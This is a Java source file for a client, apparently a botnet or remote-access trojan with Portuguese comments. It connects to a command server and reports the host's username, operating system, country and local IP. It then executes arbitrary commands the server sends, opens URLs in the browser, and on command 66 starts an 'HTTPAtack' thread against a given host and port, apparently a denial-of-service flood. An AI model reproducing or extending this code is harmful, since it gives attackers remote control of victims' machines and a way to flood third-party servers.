package br.com.pricher.server;

import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.net.URI;

/**
 * Created by Douglas Giovanella on 31/07/2017.
 */
public class Client {

    private Socket socket;
    private OutputStream ou;
    private Writer ouw;
    private BufferedWriter bfw;

    public static void main(String[] args) throws IOException {
        Client app = new Client();
        app.connect();
        app.execute();
    }

    private void connect() throws IOException {
        socket = new Socket("localhost", 8094);
        ou = socket.getOutputStream();

        ouw = new OutputStreamWriter(ou);
        bfw = new BufferedWriter(ouw);
        //Nome de usuario no pc
        String osUser = System.getProperty("user.name");
        //Sistema Operacional
        String osName = System.getProperty("os.name");
        //Pais de origem
        String osCountry = System.getProperty("user.country");

        InetAddress ipAddress = InetAddress.getLocalHost();
        //Ip local da máquina
        String ipUser = ipAddress.getHostAddress();


        bfw.write("[" + osCountry + "]" + osUser + " - " + osName + " - [" + ipUser + "]\r\n+");
        //enviarMensagem("Computer IP: " + ipAddress.getHostAddress() + " Connected");
        bfw.flush();
    }

    /***
     * Método usado para enviar mensagem para o server socket
     * @param msg do tipo String
     * @throws IOException retorna IO Exception caso dê algum erro.
     */
    private void sendMessage(String msg) throws IOException {
        bfw.write(msg + "\r\n");
        bfw.flush();
    }

    /**
     * Método usado para receber mensagem do servidor
     *
     * @throws IOException retorna IO Exception caso dê algum erro.
     */
    private void execute() throws IOException {

        InputStream in = socket.getInputStream();
        InputStreamReader inr = new InputStreamReader(in);
        BufferedReader bfr = new BufferedReader(inr);
        String msg = "";

        while (!"Exit".equalsIgnoreCase(msg))
            if (bfr.ready()) {
                msg = bfr.readLine();
                String[] msgFormatted = msg.split("&");

                switch (Integer.parseInt(msgFormatted[0])) {
                    case 0:
                        Runtime.getRuntime().exec(msgFormatted[1]);
                        sendMessage("Computador programado para desligar!");
                        break;
                    case 1:
                        try {
                            java.awt.Desktop.getDesktop().browse(new URI(msgFormatted[1]));
                            sendMessage("Site " + msgFormatted[1] + " aberto!");
                        } catch (Exception e) {
                            e.printStackTrace();
                            sendMessage(e.getMessage());
                        }
                        break;
                    case 2:
                        Runtime.getRuntime().exec(msgFormatted[1]);
                        break;
                    case 66:
                        new HTTPAtack(msgFormatted[1], Integer.parseInt(msgFormatted[2])).start();
                        break;
                    default:
                        sendMessage("Erro ao enviar o comando.");
                        break;

                }
            }
    }

    /*
    private void exit() throws IOException {
        sendMessage("Exit");
        bfw.close();
        ouw.close();
        ou.close();
        socket.close();
    }*/
}
